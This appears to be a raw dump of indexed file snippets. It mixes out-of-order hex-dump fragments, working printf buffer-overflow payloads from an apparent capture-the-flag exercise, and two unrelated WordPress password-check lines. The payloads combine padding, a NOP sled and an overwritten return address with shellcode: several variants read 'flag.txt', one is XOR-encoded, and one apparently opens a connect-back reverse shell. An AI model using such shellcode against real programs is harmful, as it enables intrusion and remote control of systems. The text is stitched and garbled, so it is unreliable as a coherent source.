7d722ffaba067f01ea17bbad3d7855cb|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00a0  
ae8fcc1354f8bb9d51016ebc892313c7|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .,.]u.9....{oU..
9eaeac449c8c1b3cb72f1206c9611777|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...........r....
63e995bd86f531af7a6b4b0ff4ccbfe0|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00b0  
7e56d91c5f021524507445a50564d878|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0090  
8e6d1127cf2366b6a29f49de2ef31107|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   wd....%...d.u...
cdd737f0fc721ef0846a2f63ea16927b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00c0  
794df324d610d5fd4014d7b0357814ba|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..%..&..[.......
f42e14b0efd5a3562a28dcebb518d536|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .....c..`..W...h
d0efa25bc5e0e7bce42f8975fcd74c12|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00d0  
b713c520ca14f677d3d1a71ad11a85ec|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00e0  
ea368ce26d846492ba0b3bf6ed221496|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   k.fM...Y...e...]
9c042ac4d0fcb82fee393a3d8a735a94|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00f0  
3b238d0a320e36310ed0664603c374b8|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...S....*..z....
ef4d669a9afd5e6aae8ceb942f402ebb|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0100  
5c4bd753854686c8ffd49c69be255260|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   7..R_.......;.7.
b3d472effa10708233d58c29d38f6c55|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0110  
fd54b0d9ed314021ed29a9d035315a9a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .Vs-.SI#.Oo3G.`.
6655f79da72d90e85aea22eba3ae661a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0120  
33cd88d35be891540da801bb89dcae05|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   >..ku.....1.=.~.
cae35c69752abdb40e13ffc4e721c428|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0130  
2e47c0fa3b00a318b10d07311a95923a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0140  
b752430a28170c7572e5c131b6d5d08c|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   1........H.1\../
43a92ad431fa016192056778256dea2b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0150  
2af89f7cf461a34c13b7a80ff9dea4ee|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   Z...c...a!....>.
ecb8fc5125e88b87239d520b0df7eddf|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0160  
6bb6a31d5529e5eb8f8fd58de5b68ef5|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	D< A..
0d766c11601584940b8a1b30c092a03c|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0170  
b2f0af59fcfb484cbf5588c56ce94aa0|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	.. .IDATx.
08105fb32f06c6fd3fe724226ee9a817|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .....v../....;9.
99d901f2910a76da72f0b8ff653d4def|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0180  
23d1efbebfca0433f5e89e3aca5dab77|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   R..4G....Z0.".d.
1689159cb5b4cffc6994ecb212aa9843|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0190  
95c995db888ab1e02312dbb8b645cde8|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..B'~...!.tEs6T.
bf3ac1c9f862ecfde5b303e6cc9cab20|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01a0  
eba28d6d25072e991ba37080270d46d5|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01b0  
b4010877530f9b959355dfc1db6f8ae4|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .U"8.!.K@G./GQA.
3750aedf8d18f3cf9c14e45e74b52e5b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01c0  
cfc34f95a67977f3184f059ace50bdef|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01d0  
ad40513b7826bfbb0769d7ef34dcb8b0|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...%.2........2,
02f9cb31331994b343c4cd6dda989186|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   <.a...z.b>.a7...
cc1306276b27a6af61e0796915649366|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01e0  
a7cad2ae4aae6a1156eddd9701520295|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...dT?...ZR....0
4d4a58c8a7c02ac324a279bb2afd370a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..!.<...l....{`.
ac5dae06e1b7bc8096b3d60c3351d09f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01f0  
4294ba7a2148cab38e9322ded453461d|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   -w.s[-nI.....Y.C
a589059daa148774f7bcaa12a20f5448|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   B..9......p)..ml
a2b248197d853362897d5175c682032b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0200  
7d214afcbba0e210aeea47926bf82671|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .{`...=0......H.
25c9a90219b1ff7b07e033209448cd15|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0210  
9d605ad790073eb9256de54d4401f8ed|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .z..g>`....!.&|.
1d78a83b07189c47b7e3f097be316ef8|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0220  
5243673fbd5f292c2e09e57db49988e3|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   FM.j..5..C....{.
af20b3195a1c5432d6120a4c06b58b40|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0230  
8c11518bacb7fbe548859b5e633f8d7a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ^D:>......8....x
26e25c4776dd9c0f78da152e38b9d753|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0240  
9e8e9959ed003793806d935dc4eee00d|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ....k...@.......
9b90940cc75cd755033b4d1d147b09b0|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0250  
2740f991abde3a6199eeb48d1daef06a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ../.....!.8p....
dc1c0ed06d1ef51db3440d2d77755c45|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .#.c.-V~...y..
2aa23d25bd9c8f6ddbedf02802a47311|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   D.dC............
ac1c700fbc1559a162b1da0bfc419bc4|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ......o..h...,./
737628317533ddc44ee0e14295a313ce|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   b.......?".:R=l.
5ee9508116d8d76893fc2dc7b3319b43|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0030  
469743bde77275c00589497c22fd017f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   =......O',V.....
e4ff707d1d999990775e8aec9faf402e|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0040  
3c2ceaf72c1c406ccda38071f3b57f26|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   N....'.u.|......
e88891c82fbd443e8650720249ae903f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0050  
28b0bafb8aaa9b07248e8c1d5eaa9452|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .2.....9@.x.J...
6d6d301bfb1806924cd89bc8471c544f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...x...u.+f.....
60ce87038f6b41cacea9daff81fcd8fa|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0060  
186bd4e607a093f669e4ba748a1d4767|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0070  
7f65912164c1bcc8b94ea5e4bd39b24e|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..nw......W.....
8381b46d93f81f8cccf69ada82cbcb1d|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0080  
50dbea41e783ec69ff77cef6d5260d53|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .......8*xmh.l..
50dcc6530a575ba4356bb25229e59555|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   Q..t.......a....
7e56d91c5f021524507445a50564d878|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0090  
7d722ffaba067f01ea17bbad3d7855cb|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00a0  
b32e029069c01ba98b070c56f572b5fd|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   is..........c.#.
63e995bd86f531af7a6b4b0ff4ccbfe0|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00b0  
a52f4cc7b5d296f3ca0ad575ce5461b8|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .R...v.B..e.1...
cdd737f0fc721ef0846a2f63ea16927b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00c0  
58dada8122fa9b733ca3247735f607a6|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..7....~...u..gv
d0efa25bc5e0e7bce42f8975fcd74c12|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00d0  
9c59d7a03d88f09ce615b5f2e9c9422b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   +....o.....v.,..
b713c520ca14f677d3d1a71ad11a85ec|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00e0  
106b4f4bd3eae2d34ac00ecb17d367c8|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .?...M....b..*..
9c042ac4d0fcb82fee393a3d8a735a94|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00f0  
c2709755365434ef4e499dabe9550cf4|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...b7b.....gx.R.
ef4d669a9afd5e6aae8ceb942f402ebb|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0100  
dcb18a96cf0faeba907fa325e2fe14be|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...a;N....{.....
b3d472effa10708233d58c29d38f6c55|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0110  
45f1aaf3fa71fd57d8f381fe7e562c73|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ....7..G.;Pf.'.A
6655f79da72d90e85aea22eba3ae661a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0120  
58cc3b314ca56103c83863ff37514f3f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..,9.a?..(]4..!.
cae35c69752abdb40e13ffc4e721c428|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0130  
5d1209619656e2ee79f335afd628c0e0|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .>...#...t5{...N
2e47c0fa3b00a318b10d07311a95923a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0140  
f22dc8f13f55196a0c61c675c6a35707|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..r"t:..n..l.V..
43a92ad431fa016192056778256dea2b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0150  
453306edbe9792183f24d302806327e5|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0260  
5d8384e9a0500e30eeba43d214fae80b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ....=..h.oD9....
ecb8fc5125e88b87239d520b0df7eddf|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0160  
46d70e96c7a99983a94b40a305dbcc3b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ....(29....n.[..
0d766c11601584940b8a1b30c092a03c|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0170  
99d901f2910a76da72f0b8ff653d4def|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0180  
66259582b7015a2a40ceb6c0f87f27a2|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   i..@.T.o~.|.%...
1689159cb5b4cffc6994ecb212aa9843|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0190  
e5d8f90f75d9f5bd599648451899d966|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   v.=...Vh........
b02780a25288b8be96506f77b9d3a61d|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   r.o..~.....V.g..
bf3ac1c9f862ecfde5b303e6cc9cab20|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01a0  
81e8b3de0856ec176babdf6d28eb35b5|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   y...}.t@........
eba28d6d25072e991ba37080270d46d5|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01b0  
3750aedf8d18f3cf9c14e45e74b52e5b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01c0  
5ffc14daed1dd0dbc436ac413190176f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	.. p=...
e51dcd1f83975cd809e38b8a0c3f6e63|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .....,..y).;.N.c
cfc34f95a67977f3184f059ace50bdef|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01d0  
1021424edebbdfd32c6ab84b2ea9433e|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   j....u..../..0>w
cc1306276b27a6af61e0796915649366|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01e0  
8f185b48e2960dc4b883c1b2b98db9e9|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .)..P)..J......\
ac5dae06e1b7bc8096b3d60c3351d09f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	01f0  
7066f9f88dba02b9e4505297c67ed5f8|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...UI...-`......
a2b248197d853362897d5175c682032b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0200  
031de8f7944331ac9d0fed61245e9c97|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .Q.l.e2..<.... ^
25c9a90219b1ff7b07e033209448cd15|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0210  
e419565125d913010b9ec6574f5dc71c|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ......D.........
1d78a83b07189c47b7e3f097be316ef8|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0220  
81a5079f1373f1184f60379a44fb6430|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   8t.>.J..D..u....
af20b3195a1c5432d6120a4c06b58b40|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0230  
4c14f6acc7f181a02fdef818fa20cb37|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .Z8.E...........
26e25c4776dd9c0f78da152e38b9d753|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0240  
f6e0b97b93c08a3f558cfccd95f5c942|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ....?.e.<......m
9b90940cc75cd755033b4d1d147b09b0|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0250  
2f9191b3511889a2c4e1ee95e143ac0a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..2K...@..../...
453306edbe9792183f24d302806327e5|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0260  
e6145f833cd1ecf229eb0d55e650bdee|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..8..H~...IM..
0796e29ebd62c706250fe4618e62d728|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...Jz.C.k.......
16179b41071af3c7270145ae2ee57a59|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   }O.u...|h.*.^.T.
e6a616b197aa130170a596f010bea9db|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...B......U.....
5ee9508116d8d76893fc2dc7b3319b43|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0030  
b44362dab9bb68fe5fa383c8fec85438|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..o.....s..R...T
e4ff707d1d999990775e8aec9faf402e|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0040  
6b3eadcaedcd1b92f8e706d039e8be45|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   B.k..9.Q.z..mY..
e88891c82fbd443e8650720249ae903f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0050  
99b62d97b90375f8b7f53e916524d5fd|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   /A.._...nt...%..
60ce87038f6b41cacea9daff81fcd8fa|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0060  
41842bde3d81e15624aa95f900badacf|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...>.y?0........
186bd4e607a093f669e4ba748a1d4767|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0070  
d166e8f3a5e6463d76ea3703fbc478c2|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .......5a.......
8381b46d93f81f8cccf69ada82cbcb1d|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0080  
fdb283957f00971f0058a7695fd0b186|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .g...7.&#$.z}yx~
7e56d91c5f021524507445a50564d878|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0090  
aa16de7e1f8fcab3afb489d6412ad0d6|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ........m.!t;...
7d722ffaba067f01ea17bbad3d7855cb|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00a0  
6188e9f4c3379e2110883b0b669f9835|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..Q...:.tJu=....
63e995bd86f531af7a6b4b0ff4ccbfe0|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00b0  
488759dd208c9c5ea462ebf5ad38d001|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .l......?.(Y4.R.
cdd737f0fc721ef0846a2f63ea16927b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00c0  
d0efa25bc5e0e7bce42f8975fcd74c12|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00d0  
b713c520ca14f677d3d1a71ad11a85ec|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00e0  
0a653a41cc67309ed203a97c8b3c65ca|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   /...<..........\
dcaff57d53ef611b780a5f1b0965d476|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .><'.N...k-b."..
d2619cd038da22417b36f0c1de1195ae|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...T[^..K......z
9c042ac4d0fcb82fee393a3d8a735a94|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	00f0  
b91faef0a53d000432fd0644bd224a42|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .........wQ$....
ef4d669a9afd5e6aae8ceb942f402ebb|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0100  
6fb2ccc359530c21be4f470743b00ab6|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   oF7.cP.fQ..N....
b3d472effa10708233d58c29d38f6c55|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0110  
6655f79da72d90e85aea22eba3ae661a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0120  
7da9fc71dadea3b9a4984fe1bb02fbec|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ....../<.1...(..
cae35c69752abdb40e13ffc4e721c428|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0130  
8ca452c11075d03a61d7b68c3a28a500|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .n...D..i..-...8
2e47c0fa3b00a318b10d07311a95923a|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0140  
a10c99329a1be3c703207a492dccf11e|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	.. ..(..
43a92ad431fa016192056778256dea2b|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0150  
848436de056a630d44483bb92ff54693|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..".~..*.&..|.E.
ecb8fc5125e88b87239d520b0df7eddf|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0160  
3619468423745fcebf79ffe36b598416|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .F....j./....0n.
0d766c11601584940b8a1b30c092a03c|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0170  
9ce5750a7cdedff7be8f9800b7ec303c|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ....}.\.....]O..
dc36a4c93bc0ebacd6e27741dd4292ab|file:///home/neo/ccsc/guydebois/shellcode.txt|28|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xf6\xf7\xe6\x52\x48\xb9txt.galf\x51\x54\x5f\xb0\x02\x0f\x05\x50\x5f\x54\x5e\x52\x52\x52\x52\x58\x66\xba\x99\x09\x0f\x05\x5f\xff\xc7\x50\x5a\x58\xff\xc0\x0f\x05\x58\xb0\x3c\x0f\x05"
f20bb075e1b6fac8ed14c112fff18906|file:///home/neo/ccsc/guydebois/shellcode.txt|30|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xfftxt.galf"
9ea90acf592787cb5a8ed0e2d78f6060|file:///home/neo/ccsc/guydebois/shellcode.txt|14|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x0a\x03\xf2\x72\x5e\x66\x68\x82\x35\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce"
bb85f8741c88d45f7078e3aa44abc82f|file:///home/neo/ccsc/guydebois/shellcode.txt|51|1|V|text
	\xeb\x11\x5e\x31\xc9\xb1\x26\x80\x74\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x30\xc1\x30\xda\x30\xc8\x30\xd3\xb1\x47\x30\xda\x30\xc8\xcc\x81\xb1\x0a\x52\x69\x2e\x2e\x72\x69\x69\x2e\x63\x68\x6f\x88\xe2\x30\xc8\x30\xc8\x52\xcc\x81
2caa425bd8cb05bdb16aaf33dfda3013|file:///home/neo/ccsc/guydebois/shellcode.txt|51|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x11\x5e\x31\xc9\xb1\x26\x80\x74\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x30\xc1\x30\xda\x30\xc8\x30\xd3\xb1\x47\x30\xda\x30\xc8\xcc\x81\xb1\x0a\x52\x69\x2e\x2e\x72\x69\x69\x2e\x63\x68\x6f\x88\xe2\x30\xc8\x30\xc8\x52\xcc\x81"
a942b4d8a880048b6032eef403322e19|file:///home/neo/ccsc/guydebois/shellcode.txt|51|1|V|text
	\xeb\x11\x5e\x31\xc9\xb1\x26\x80\x74\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x30\xc1\x30\xda\x30\xc8\x30\xd3\xb1\x47\x30\xda\x30\xc8\xcc\x81\xb1\x0a\x52\x69\x2e\x2e\x72\x69\x69\x2e\x63\x68\x6f\x88\xe2\x30\xc8\x30\xc8\x52 \xcc\x81
532f4e3161d00ec877ea1b3ac021a5ab|file:///home/neo/ccsc/guydebois/shellcode.txt|9|1|V|text
	\x4d\x31\xc0\x41\xb1\x3c\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x74\x0d\xfc\x74\xbf\xfc\x4d\x74\x0d\xc3\x74\x0d\xca\x33\x39\xd7\x2e\x74\x0d\xfc\x74\xbf\xfc\x07\x63\x74\x0d\xee\x6e\x6b\x74\xb5\xda\x33\x39\xd4\xd5\xc3\xc3\xc3\x13\x5e\x55\x52\x13\x46\x4f\x54
b87b5fedb42667f00ee8c14c18e0cc91|file:///home/neo/ccsc/guydebois/shellcode.txt|7|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x4d\x31\xc0\x41\xb1\x3c\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x74\x0d\xfc\x74\xbf\xfc\x4d\x74\x0d\xc3\x74\x0d\xca\x33\x39\xd7\x2e\x74\x0d\xfc\x74\xbf\xfc\x07\x63\x74\x0d\xee\x6e\x6b\x74\xb5\xda\x33\x39\xd4\xd5\xc3\xc3\xc3\x13\x5e\x55\x52\x13\x46\x4f\x54"
331372bfc20ed00cfa6c061d8c88e248|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2382|1|V|php
				$check = hash_equals( $hash, md5( $password ) );
				if ( $check && $user_id ) {
					// Rehash using new hash.
					wp_set_password( $password, $user_id );
					$hash = wp_hash_password( $password );
				}
50174cdfa93bbac1508f97f4eed5cb6e|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2329|1|V|php
	                    return apply_filters( 'check_password', false, $credentials, $stored_pk, $user_id );
